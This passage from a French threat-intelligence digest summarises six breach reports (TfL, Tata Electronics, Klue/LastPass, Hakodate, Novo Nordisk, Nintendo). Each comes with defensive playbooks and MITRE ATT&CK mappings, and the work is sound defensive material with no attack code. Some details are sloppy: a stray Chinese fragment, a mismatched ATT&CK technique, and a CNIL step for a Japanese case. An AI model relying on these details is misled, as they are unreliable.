L'incident rappelle la vulnérabilité des grandes organisations aux attaques par social engineering ciblant le helpdesk (vishing, MFA reset). Les équipes SOC doivent renforcer la détection des compromissions de comptes d'assistance, les mouvements latéraux et l'usage abusif d'identifiants légitimes. Les bonnes pratiques PAM, MFA phishing-resistant et le contrôle des prestataires sont prioritaires.

---

### Implications stratégiques

Cette condamnation confirme la pression judiciaire internationale sur Scattered Spider et démontre la résilience opérationnelle de TfL face à une crise majeure. Le secteur des transports publics est exposé à un risque systémique de perturbation et d'atteinte à l'image. Les directions doivent anticiper la mutualisation des défenses (ISAC transport) et le coût croissant des cyber-assurances.

---

### Recommandations

* Déployer une MFA résistante au phishing (FIDO2) sur 100% des comptes privilégiés helpdesk.
* Auditer les procédures de réinitialisation MFA avec vérification par callback.
* Cartographier les prestataires ayant accès à des données sensibles et imposer un SOC partagé ou audité.

---

### Playbook de réponse à incident

#### Phase 1 — Préparation

* Cartographier les prestataires tiers ayant accès au SI et leurs droits d'administration.
* Mettre en place une authentification forte (FIDO2/phishing-resistant) sur tous les comptes à privilèges, y compris helpdesk.
* Sensibiliser le personnel d'assistance aux techniques de social engineering et d'usurpation d'identité par téléphone (callback obligatoire).
* Segmenter les environnements OT/IoT (billettique, signalisation) du SI bureautique.

#### Phase 2 — Détection et analyse

* Surveiller les authentifications anormales sur les comptes d'assistance et d'astreinte (heures atypiques, géoloc incohérente).
* Détecter les mouvements latéraux via RDP/SSH depuis les postes d'assistance vers les contrôleurs de domaine.
* Alerter sur les modifications de groupes privilégiés (AD, Entra ID) par des comptes de helpdesk.
* Monitorer les requêtes inhabituelles vers les bases billettiques/paie (lectures massives).

#### Phase 3 — Confinement, éradication et récupération

* Révoquer immédiatement toutes les sessions actives des comptes de helpdesk et forcer la réinitialisation MFA.
* Isoler les segments réseau contenant les données financières RH/paie.
* Suspendre l'accès des sous-traitants suspectés et auditer leurs journaux d'activité.
* Préserver les preuves (images disques, logs AD, EDR) en vue de poursuites judiciaires.

#### Phase 4 — Activités post-incident

* Conduire une analyse forensique conjointe avec les forces de l'ordre (NCA, FBI).
* Notifier la CNIL et informer les employés concernés par la fuite de données personnelles.
* Renforcer le contrôle d'accès: moindre privilège, PAM avec session recording pour le helpdesk.
* Revoir les contrats fournisseurs (clauses MFA, audits, droit de suite).

#### Phase 5 — Threat Hunting (proactif)

* Rechercher des patterns de Scattered Spider: appels vishing ciblant le helpdesk, création de comptes admin temporaires.
* Chasser les IOC associés au groupe (domaines de phishing, adresses IP de proxy) dans les logs proxy/DNS.
* Analyser les historiques d'authentification pour identifier d'éventuelles compromissions antérieures non détectées.
* Exercer un threat intel sur les sous-domaines du secteur transport public britannique.

---

### TTP MITRE ATT&CK

| ID TTP | Description |
|---|---|
| **T1566** | Phishing |
| **T1078** | Valid Accounts |
| **T1486** | Data Encrypted for Impact |

---

### Sources

* [https://databreaches.net/2026/06/22/two-men-believed-to-part-of-scattered-spiders-plead-guilty-over-39m-tfl-cyber-attack/](https://databreaches.net/2026/06/22/two-men-believed-to-part-of-scattered-spiders-plead-guilty-over-39m-tfl-cyber-attack/)


---

<div id="tata-electronics-confirme-une-cyberattaque-world-leaks-publie-630-go-de-presumes-secrets-apple-et-tesla"></div>

## Tata Electronics confirme une cyberattaque : World Leaks publie 630 Go de présumés secrets Apple et Tesla

### Résumé

Tata Electronics a confirmé avoir subi une cyberattaque après que le groupe d'extorsion World Leaks a publié environ 630 Go de données présentées comme des fichiers liés à Apple (spécifications d'iPhone) et à Tesla (secrets commerciaux).

---

### Analyse opérationnelle

L'incident souligne l'exposition des sous-traitants électroniques (EMS) en tant que maillon faible de la chaîne d'approvisionnement. Les SOC doivent surveiller spécifiquement les accès aux données de R&D et CAO, les volumes d'exfiltration sortants et la présence de données de clients tiers. Les mesures de chiffrement, segmentation par client et surveillance DLP deviennent critiques pour les fabricants sous contrat.

---

### Implications stratégiques

L'attaque met en évidence le risque systémique pour les OEMs (Apple, Tesla) lorsque des partenaires de fabrication sont compromis. Les conséquences peuvent inclure la perte de propriété intellectuelle, des litiges contractuels, une atteinte à la confiance client et une reconsidération des stratégies de nearshoring en Inde. Le secteur des sous-traitants EMS devient une cible privilégiée pour l'extorsion et l'espionnage industriel.

---

### Recommandations

* Imposer une segmentation réseau stricte par client/donneur d'ordre avec des identités dédiées.
* Mettre en œuvre du DLP sur les fichiers de CAO, brevets et données de production.
* Auditer les capacités de détection et réponse du prestataire avant tout contrat OEM.

---

### Playbook de réponse à incident

#### Phase 1 — Préparation

* Maintenir un inventaire exhaustif des données clients hébergées (Apple, Tesla, etc.) et de leur classification.
* Chiffrer au repos et en transit les données de propriété intellectuelle de tiers.
* Disposer d'un plan de communication de crise dédié aux violations de données clients.
* Évaluer contractuellement les obligations de notification vis-à-vis des donneurs d'ordre.

#### Phase 2 — Détection et analyse

* Surveiller les volumes d'exfiltration vers des services de stockage externes (Mega, Dropbox, serveurs inconnus).
* Détecter les accès anormaux aux répertoires de R&D, de prototypage et de CAO.
* Monitorer les communications sortantes inhabituelles depuis les serveurs de fichiers de production.
* Alerter sur les éventuelles revendications publiées sur des sites leak du groupe World Leaks.

#### Phase 3 — Confinement, éradication et récupération

* Isoler les serveurs compromis et révoquer toutes les sessions applicatives associées.
* Notifier immédiatement les clients impactés (Apple, Tesla) et leurs CSIRT.
* Suspendre les flux de données vers les partenaires tant que la chaîne de compromission n'est pas comprise.
* Engager la procédure de notification CNIL et autorités de protection des données.

#### Phase 4 — Activités post-incident

* Analyser forensiquement les vecteurs d'entrée initiaux (phishing, compte tiers, VPN).
* Renforcer la séparation logique des données entre donneurs d'ordre concurrents.
* Auditer les contrôles d'accès des sous-traitants ayant accès aux données Apple/Tesla.
* Revoir les engagements contractuels de cybersécurité avec les clients OEM.

#### Phase 5 — Threat Hunting (proactif)

* Rechercher des IOC liés à World Leaks (domaines, hash, wallets crypto) dans les logs.
* Auditer les accès VPN et les authentifications à distance antérieurs à l'incident.
* Chasser des implants dormants via analyses mémoire sur les stations de R&D.
* Surveiller les places de marché dark web pour la revente des données de propriété intellectuelle.

---

### TTP MITRE ATT&CK

| ID TTP | Description |
|---|---|
| **T1566** | Phishing |
| **T1078** | Valid Accounts |
| **T1041** | Exfiltration Over C2 Channel |
| **T1657** | Financial Theft (extortion) |

---

### Sources

* [https://thecybersecguru.com/news/tata-electronics-confirms-cyberattack-as-world-leaks-posts-630gb-of-alleged-apple-and-tesla-trade-secrets/](https://thecybersecguru.com/news/tata-electronics-confirms-cyberattack-as-world-leaks-posts-630gb-of-alleged-apple-and-tesla-trade-secrets/)


---

<div id="klue-nouvelle-compromission-de-donnees-impliquant-lastpass"></div>

## Klue : nouvelle compromission de données impliquant LastPass

### Résumé

Une nouvelle compromission de données liée à l'écosystème LastPass est signalée chez Klue, un éditeur SaaS. Le contenu détaillé de l'incident n'est pas précisé dans la source, mais il s'inscrit dans la série d'incidents affectant des clients de LastPass.

---

### Analyse opérationnelle

L'incident renforce la nécessité de considérer tout gestionnaire de mots de passe tiers comme un point de défaillance potentiel. Les SOC doivent surveiller les bulletins LastPass, préparer des procédures de rotation rapide des identifiants et privilégier une authentification fédérée (SSO/MFA) plutôt que des coffres centralisés pour les comptes critiques.

---

### Implications stratégiques

La récurrence d'incidents impliquant LastPass érode la confiance envers les gestionnaires de mots de passe en mode cloud. Les organisations doivent réévaluer leur stratégie IAM, accélérer la migration vers le SSO et anticiper des exigences réglementaires accrues sur la résilience des coffres d'identifiants.

---

### Recommandations

* Migrer les comptes critiques vers une solution SSO avec MFA forte (FIDO2).
* Déployer une procédure automatisée de rotation de credentials en cas de compromission d'un coffre-fort.
* Renforcer la surveillance des accès en provenance de LastPass (IP, device fingerprint).

---

### Playbook de réponse à incident

#### Phase 1 — Préparation

* Cartographier tous les usages de LastPass dans l'organisation et identifier les comptes à privilèges stockés.
* Activer l'option de chiffrement renforcé (paramètres PBKDF2) sur tous les vaults LastPass.
* Former les utilisateurs à l'usage de mots de passe maîtres forts et uniques.

#### Phase 2 — Détection et analyse

* Surveiller les publications de LastPass sur les compromissions de coffre-fort d'identifiants.
* Alerter sur les éventuelles tentatives de réutilisation de credentials retrouvés sur des plateformes de breach.
* Vérifier l'apparition de comptes Klue dans les dumps de LastPass.

#### Phase 3 — Confinement, éradication et récupération

* Forcer la rotation immédiate des mots de passe stockés dans les coffres Klue impactés.
* Révoquer les jetons de session et API émis depuis LastPass vers d'autres services.
* Activer la MFA sur tous les services dont les identifiants étaient stockés.

#### Phase 4 — Activités post-incident

* Migrer progressivement les comptes critiques vers une solution d'authentification fédérée (SSO) afin de réduire la dépendance aux coffres de mots de passe.
* Auditer les accès et la journalisation des services tiers précédemment protégés par LastPass.
* Sensibiliser les utilisateurs aux risques de réutilisation de mots de passe maîtres compromis.

#### Phase 5 — Threat Hunting (proactif)

* Rechercher dans les logs d'authentification des services des tentatives d'utilisation de credentials associés aux vaults Klue impactés.
* Surveiller les marchés dark web pour la revente de dumps LastPass.
* Détecter les comportements de credential stuffing en provenance d'adresses IP inhabituelles.

---

### TTP MITRE ATT&CK

| ID TTP | Description |
|---|---|
| **T1078** | Valid Accounts |
| **T1552** | Unsecured Credentials |

---

### Sources

* [https://norden.social/@versatzstueck/116797519278522548](https://norden.social/@versatzstueck/116797519278522548)


---

<div id="hakodate-japon-un-agent-municipal-accede-illicitement-au-pc-dun-collegue-et-derobe-des-donnees-personnelles"></div>

## Hakodate (Japon) : un agent municipal accède illicitement au PC d'un collègue et dérobe des données personnelles

### Résumé

À Hakodate, dans la préfecture de Hokkaidō au Japon, un employé municipal a utilisé les identifiants d'un collègue pour se connecter à son PC et exfiltrer des données à caractère personnel, apparemment à des fins personnelles (usabari). L'incident est rapporté comme un cas de menace interne.

---

### Analyse opérationnelle

L'incident démontre la persistance du risque de menace interne dans les administrations locales, favorisée par le partage de mots de passe et l'absence de MFA. Les SOC doivent détecter les connexions inhabituelles, les copies de données personnelles et renforcer la journalisation (EDR, AD). Le déploiement d'un LAPS (Local Admin Password Solution) et la séparation des comptes personnels/professionnels sont prioritaires.

---

### Implications stratégiques

Le cas souligne un risque structurel pour les collectivités japonaises en matière de protection des données personnelles, avec des conséquences réputationnelles et réglementaires (APPI). Les directions doivent investir dans la gouvernance des accès, la culture de cybersécurité et la séparation des comptes pour réduire la surface d'attaque interne.

---

### Recommandations

* Déployer LAPS et imposer la MFA pour tout accès aux ressources personnelles.
* Auditer les droits d'accès et la séparation des comptes sur les postes municipaux.
* Former les agents à la détection et au signalement de comportements internes suspects.

---

### Playbook de réponse à incident

#### Phase 1 — Préparation

* Appliquer le principe de moindre privilège sur les postes professionnels municipaux.
* Mettre en place une journalisation fine des connexions et accès fichiers (Active Directory, EDR).
* Sensibiliser les agents publics aux risques de menace interne et aux sanctions associées.
* Établir une procédure formelle de gestion des départs et réaffectations (suppression rapide des droits).

#### Phase 2 — Détection et analyse

* Détecter les connexions sur des postes de collègues sans justification opérationnelle (heures tardives, écarts de poste).
* Alerter sur les copies de masse de fichiers personnels vers des supports amovibles ou cloud personnel.
* Monitorer les commandes inhabituelles d'accès au système d'information (admin local).

#### Phase 3 — Confinement, éradication et récupération

* Désactiver le compte de l'auteur et saisir les équipements concernés.
* Isoler le poste compromis et préserver les preuves pour enquête.
* Notifier les personnes dont les données ont été exposées et engager la procédure CNIL/informations à caractère personnel au Japon (APPI).

#### Phase 4 — Activités post-incident

* Analyser les causes racines (mots de passe partagés, absence de MFA, droits trop larges).
* Renforcer la séparation des comptes personnels et professionnels (LAPS, comptes admin distincts).
* Communiquer en interne pour rappeler les règles d'usage acceptable des SI municipaux.

#### Phase 5 — Threat Hunting (proactif)

* Auditer l'historique des accès sur les postes de collègues au cours des 12 derniers mois.
* Identifier d'éventuelles autres extractions anormales de données personnelles.
* Revoir les listes de droits afin de détecter des privilèges excessifs non justifiés.

---

### Indicateurs de compromission

| Type | Valeur (DEFANG) | Fiabilité |
|---|---|---|
| URL | `hxxps://rocket-boys.co.jp/security-measures-lab/hakodate-city-insider-threat-unauthorized-access/` | High |

---

### TTP MITRE ATT&CK

| ID TTP | Description |
|---|---|
| **T1078.003** | Valid Accounts: Local Accounts |
| **T1530** | Data from Cloud Storage Object (data exfiltration from internal PC) |

---

### Sources

* [https://rocket-boys.co.jp/security-measures-lab/hakodate-city-insider-threat-unauthorized-access/](https://rocket-boys.co.jp/security-measures-lab/hakodate-city-insider-threat-unauthorized-access/)


---

<div id="novo-nordisk-enquete-sur-une-violation-de-donnees-apres-une-tentative-dextorsion-de-25-m-par-fulcrumsec"></div>

## Novo Nordisk enquête sur une violation de données après une tentative d'extorsion de 25 M$ par FulcrumSec

### Résumé

Novo Nordisk a déclaré enquêter sur une violation de données après que le groupe d'extorsion FulcrumSec a affirmé avoir volé plus d'1 To de données, incluant de la recherche pharmaceutique, des informations d'essais cliniques et des dossiers d'employés, en exigeant une rançon de 25 millions de dollars.

---

### Analyse opérationnelle

L'incident représente une menace majeure pour l'intégrité des essais cliniques, la confidentialité des données patients et la R&D. Les SOC doivent renforcer la surveillance DLP sur les exfiltrations massives, surveiller les revendications du groupe FulcrumSec et mettre en place une détection des accès anormaux aux systèmes de recherche. Les sauvegardes air-gap et la segmentation R&D/SI bureautique sont prioritaires.

---

### Implications stratégiques

Cette attaque illustre l'intérêt croissant des cybercriminels pour le secteur pharmaceutique en raison de la valeur des données de R&D et des essais cliniques. Les conséquences potentielles incluent un retard de mise sur le marché, une perte d'avantage concurrentiel, des sanctions réglementaires (EMA, FDA, GDPR) et une atteinte à la confiance des patients. Les directions doivent anticiper le risque de chantage ciblant les essais cliniques et intégrer ce scénario dans leurs plans de continuité.

---

### Recommandations

* Isoler les sauvegardes de R&D et d'essais cliniques (air-gap) et tester régulièrement la restauration.
* Renforcer la segmentation réseau entre R&D, production et SI bureautique.
* Préparer un plan de communication dédié à la divulgation d'essais cliniques et de données patients.

---

### Playbook de réponse à incident

#### Phase 1 — Préparation

* Identifier et classer les actifs de R&D, essais cliniques et données RH parmi les plus sensibles.
* Mettre en place une procédure de sauvegarde isolée (air-gap) pour les données de recherche.
* Disposer d'un canal de communication de crise hors SI (téléphone, messagerie sécurisée).
* Cartographier les obligations réglementaires (GDPR, HIPAA, régulateurs pharma) en cas de fuite.

#### Phase 2 — Détection et analyse

* Surveiller les volumes d'exfiltration sortants (1 To+ alertes DLP).
* Détecter les accès anormels aux bases d'essais cliniques, données de patients et RH.
* Monitorer les revendications publiées par FulcrumSec sur leur site de leaks.
* Alerter sur les accès à des serveurs de recherche en dehors des heures ouvrées.

#### Phase 3 — Confinement, éradication et récupération

* Isoler les segments contenant la R&D et les données d'essais cliniques.
* Révoquer les accès de tous les comptes ayant pu être compromis et forcer la rotation des clés.
* Suspendre les interconnexions avec les CRO et partenaires externes le temps de l'investigation.
* Préparer un plan de communication vers les régulateurs (EMA, FDA) et les patients si applicable.

#### Phase 4 — Activités post-incident

* Conduire une analyse forensique complète et auditer les accès antérieurs de 12 mois.
* Renforcer la segmentation entre R&D, production et SI bureautique.
* Reconfigurer DLP et EDR avec règles adaptées aux données pharma et RH.
* Revoir la stratégie de cyber-assurance et de gestion de crise (négociation vs refus).

#### Phase 5 — Threat Hunting (proactif)

* Rechercher les IOC connus de FulcrumSec (hash, domaines, wallets crypto) dans les logs.
* Auditer les canaux d'exfiltration potentiels (cloud, messagerie, tunnels DNS).
* Chasser des implants persistants dans les serveurs de R&D (analyse mémoire).
* Surveiller les places de marché dark web pour la revente d'essais cliniques ou de données patient.

---

### TTP MITRE ATT&CK

| ID TTP | Description |
|---|---|
| **T1486** | Data Encrypted for Impact (potential) |
| **T1657** | Financial Theft |
| **T1041** | Exfiltration Over C2 Channel |
| **T1567** | Exfiltration Over Web Service |

---

### Sources

* [https://www.reuters.com/legal/government/hacking-group-claims-major-hack-novo-nordisk-attempted-25-million-extortion-2026-06-16/](https://www.reuters.com/legal/government/hacking-group-claims-major-hack-novo-nordisk-attempted-25-million-extortion-2026-06-16/)


---

<div id="nintendo-of-america-fuite-de-donnees-denquetes-employes-via-la-plateforme-tierce-tinypulse"></div>

## Nintendo of America : fuite de données d'enquêtes employés via la plateforme tierce TinyPulse

### Résumé

Nintendo of America a confirmé qu'une violation de données impliquant la plateforme tierce d'enquêtes employés TinyPulse a exposé des données internes d'enquêtes auprès des employés. Nintendo précise que ses propres systèmes n'ont pas été compromis et qu'aucune donnée client ou financière n'a été consultée.

---

### Analyse opérationnelle

L'incident illustre le risque d供应链 (supply chain) via les plateformes SaaS tierces. Les SOC doivent renforcer la surveillance des intégrations avec les fournisseurs externes, suivre les bulletins de compromission de plateformes RH et mettre en place des procédures de suspension rapide des connecteurs API. La gestion du risque tiers (TPRM) et les clauses contractuelles de notification sont déterminantes.

---

### Implications stratégiques

Nintendo subit une atteinte d'image limitée mais réelle, sur fond d'augmentation des attaques contre les sous-traitants SaaS. Les directions doivent accélérer leurs programmes TPRM, exiger des certifications (SOC 2, ISO 27001) et diversifier les fournisseurs critiques pour éviter les points de défaillance uniques. Le secteur des plateformes d'enquêtes RH est désormais une cible identifiée.

---

### Recommandations

* Imposer des clauses de notification sous 72h pour tout incident chez les fournisseurs tiers.
* Auditer annuellement la sécurité des plateformes SaaS traitant des données d'employés.
* Déployer une surveillance continue du risque tiers (TPRM continu) pour les services critiques.

---

### Playbook de réponse à incident

#### Phase 1 — Préparation

* Maintenir un inventaire à jour de tous les fournisseurs tiers traitant des données d'employés.
* Inclure dans les contrats des clauses de notification sous 24-72h en cas d'incident.
* Évaluer la sensibilité des données partagées avec chaque plateforme tierce (RH, enquêtes, sondages).
* Cartographier les flux de données entre SI interne et SaaS tiers.

#### Phase 2 — Détection et analyse

* Surveiller les annonces publiques de compromission de fournisseurs (TinyPulse, WebMD Subsidiary, etc.).
* Détecter les accès anormaux depuis les connecteurs d'API vers les plateformes RH tierces.
* Monitorer les dumps de données d'enquêtes employés sur les marchés dark web.
* Alerter sur les éventuelles correlations entre comptes d'employés et fuites externes.

#### Phase 3 — Confinement, éradication et récupération

* Suspendre l'intégration entre le SI interne et la plateforme tierce compromise.
* Révoquer les jetons d'API et comptes de service associés au fournisseur.
* Notifier les employés dont les données d'enquêtes ont pu être exposées.
* Vérifier qu'aucun identifiant interne n'a été compromis via la plateforme tierce.

#### Phase 4 — Activités post-incident

* Auditer tous les fournisseurs SaaS ayant accès à des données d'employés (questionnaires de sécurité).
* Renforcer la segmentation entre les données d'enquêtes RH et les systèmes critiques.
* Diversifier ou remplacer les plateformes single-point-of-failure (enquêtes, sondages).
* Revoir les processus d'onboarding/offboarding de ces services.

#### Phase 5 — Threat Hunting (proactif)

* Chasser des IOC liés au compromission de TinyPulse dans les logs de proxy/Email.
* Identifier d'autres filiales WebMD ou services partageant l'infrastructure compromise.
* Analyser les comptes d'employés référencés dans des dumps dark web.
* Surveiller les tentatives de réutilisation de credentials d'employés sur d'autres services.

---

### TTP MITRE ATT&CK

| ID TTP | Description |
|---|---|
| **T1199** | Trusted Relationship |
| **T1078** | Valid Accounts |
| **T1041** | Exfiltration Over C2 Channel |

---

### Sources

* [https://www.bleepingcomputer.com/news/security/nintendo-confirms-data-stolen-in-webmd-subsidiary-cyberattack/](https://www.bleepingcomputer.com/news/security/nintendo-confirms-data-stolen-in-webmd-subsidiary-cyberattack/)
